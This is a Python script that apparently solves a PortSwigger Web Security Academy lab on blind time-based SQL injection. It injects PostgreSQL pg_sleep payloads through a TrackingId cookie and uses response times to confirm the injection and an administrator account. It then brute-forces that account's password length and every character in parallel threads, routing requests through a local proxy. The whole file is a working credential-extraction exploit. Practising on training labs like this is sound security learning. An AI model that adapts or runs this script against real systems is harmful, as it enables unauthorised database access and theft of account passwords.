import requests
import string
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple

id = "tZEFguzJCtoySB7V"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

target_url = "https://0afc009b04425ee780709afc00ce00a1.web-security-academy.net/"
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
cookies = {
    "session": "lGxGgYI2gYuQP3W0HRgZMGETTY0uk2vA"
}
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"
}
charset = string.ascii_lowercase + string.digits

def send_request(payload: str, max_retries: int = 3) -> float:
    cookies_with_payload = {"TrackingId": payload}
    cookies_with_payload.update(cookies)
    
    for attempt in range(max_retries):
        try:
            start_time = time.time()
            response = requests.get(
                url=target_url,
                cookies=cookies_with_payload,
                headers=headers,
                timeout=15,
                proxies=proxies,
                verify=False
            )
            end_time = time.time()
            response_time = end_time - start_time
            logging.info(f"Payload: {payload}")
            logging.info(f"Status: {response.status_code}, Response time: {response_time:.2f} seconds")
            return response_time
        except requests.RequestException as e:
            if attempt == max_retries - 1:
                logging.error(f"Request failed for payload {payload}: {str(e)}")
                return -1
            time.sleep(1)  # Wait before retrying
    return -1

def verify_sql_injection() -> bool:
    logging.info("Testing SQL Injection with 1=1 (should delay 10s)")
    payload_true = f"{id}'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--"
    time_true = send_request(payload=payload_true)
    
    logging.info("Testing SQL Injection with 1=2 (should be instant)")
    payload_false = f"{id}'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--"
    time_false = send_request(payload=payload_false)
    
    if time_true >= 3 and time_false < 2 and time_true != -1 and time_false != -1:
        logging.info("SQL Injection verified successfully ✌🏼✅")
        return True
    else:
        logging.error(f"SQL Injection verification failed 😞❌ (True: {time_true:.2f}s, False: {time_false:.2f}s)")
        return False

def check_admin_exists() -> bool:
    logging.info("Checking if administrator user exists")
    payload = f"{id}'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
    response_time = send_request(payload)
    
    if response_time >= 3:
        logging.info("Administrator user exists")
        return True
    else:
        logging.error("Administrator user does not exist")
        return False

def find_password_length(max_length: int = 30) -> int:
    logging.info("Determining password length")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for length in range(1, max_length + 1):
            payload = f"{id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>{length})+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
            futures.append(executor.submit(send_request, payload))
        
        for length, future in enumerate(futures, 1):
            response_time = future.result()
            if response_time < 2 and response_time != -1:
                logging.info(f"Password length is {length}")
                return length
    logging.warning(f"Could not determine password length within {max_length} characters")
    return 0

def check_char_parallel(args: Tuple[int, str]) -> Tuple[int, str, bool]:
    position, char = args
    payload = f"{id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
    response_time = send_request(payload)
    return (position, char, response_time >= 3)

def extract_password(length: int) -> str:
    logging.info(f"Extracting password of length {length}")
    password = ['?'] * length
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        for position in range(1, length + 1):
            logging.info(f"Checking position {position}")
            char_tasks = [(position, char) for char in charset]
            futures = [executor.submit(check_char_parallel, task) for task in char_tasks]
            
            for future in as_completed(futures):
                pos, char, found = future.result()
                if found:
                    password[pos-1] = char
                    logging.info(f"Found character '{char}' at position {pos}")
                    # Cancel remaining futures for this position
                    for f in futures:
                        f.cancel()
                    break
    
    return "".join(password)

def main():
    if not verify_sql_injection():
        logging.error("Aborting due to SQL Injection failure")
        return
    
    if not check_admin_exists():
        logging.error("Aborting due to no administrator user")
        return
    
    password_length = find_password_length()
    if password_length == 0:
        logging.error("Aborting due to failure in finding password length")
        return
    
    final_password = extract_password(password_length)
    print(f"\nAdministrator password: {final_password}")

    if "?" in final_password:
        print("⚠️ Warning: Some characters could not be determined and were replaced with '?'")
        
if __name__ == "__main__":
    main()